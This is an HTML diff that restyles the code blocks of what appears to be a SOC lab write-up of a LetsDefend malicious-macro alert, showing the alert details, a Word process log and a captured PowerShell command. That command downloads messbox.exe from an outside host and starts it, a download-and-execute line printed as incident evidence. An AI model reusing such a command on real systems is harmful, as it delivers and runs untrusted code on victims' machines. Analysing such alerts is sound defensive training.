@@ -969,17 +969,17 @@
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">EventID :            231
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Event Time :         Feb, 28, 2024, 08:42 AM
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Rule :               SOC205 - Malicious Macro has been executed
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Level :              Security Analyst
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Hostname :           Jayne
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">IP Address :         172.16.17.198
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">File Name :          edit1-invoice.docm
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">File Path :          C:\Users\LetsDefend\Downloads\edit1-invoice.docm
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">File Hash :          1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0
-</span></span><span class="line"><span class="ln">10</span><span class="cl">Trigger Reason :     Suspicious file detected on system.
-</span></span><span class="line"><span class="ln">11</span><span class="cl">AV/EDR Action :      Detected</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>EventID :            231
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>Event Time :         Feb, 28, 2024, 08:42 AM
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>Rule :               SOC205 - Malicious Macro has been executed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>Level :              Security Analyst
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>Hostname :           Jayne
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>IP Address :         172.16.17.198
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>File Name :          edit1-invoice.docm
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>File Path :          C:\Users\LetsDefend\Downloads\edit1-invoice.docm
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>File Hash :          1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>Trigger Reason :     Suspicious file detected on system.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>AV/EDR Action :      Detected</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Identification</span>
     <div id="identification" class="anchor"></div>
@@ -1049,14 +1049,14 @@
     
 </h4>
 <p>Process creation log Event ID 4688 showed that WINWORD.EXE (PID 4545) spawned <code>powershell.exe</code> under the LetsDefend account:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">&#39;C:\Program Files\Microsoft Office\Office14\WINWORD.EXE&#39; /n
-</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39;C:\Users\admin\AppData\Local\Temp\edit1-invoice.docm&#39;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&#39;C:\Program Files\Microsoft Office\Office14\WINWORD.EXE&#39; /n
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>&#39;C:\Users\admin\AppData\Local\Temp\edit1-invoice.docm&#39;</span></span></code></pre></div></div>
 <p>PowerShell Script Block Logging Event ID 4104 captured the full command at <strong>08:42 AM</strong>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="s1">&#39;http://www.greyhathacker.net/tools/messbox.exe&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="s1">&#39;mess.exe&#39;</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">)</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="nb">Start-Process</span> <span class="s1">&#39;mess.exe&#39;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>(New-Object System.Net.WebClient).DownloadFile(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  <span style="color:#e6db74">&#39;http://www.greyhathacker.net/tools/messbox.exe&#39;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  <span style="color:#e6db74">&#39;mess.exe&#39;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>Start-Process <span style="color:#e6db74">&#39;mess.exe&#39;</span></span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
